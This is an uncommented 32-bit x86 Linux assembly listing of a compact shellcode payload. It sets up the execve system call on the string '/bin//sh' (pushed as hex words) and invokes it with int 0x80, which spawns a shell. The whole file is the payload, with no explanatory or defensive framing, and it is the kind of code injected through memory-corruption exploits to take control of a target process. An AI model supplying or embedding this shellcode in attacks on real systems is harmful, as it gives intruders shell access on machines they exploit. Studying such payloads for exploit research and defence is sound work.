global _start
section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 11
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    int 0x80
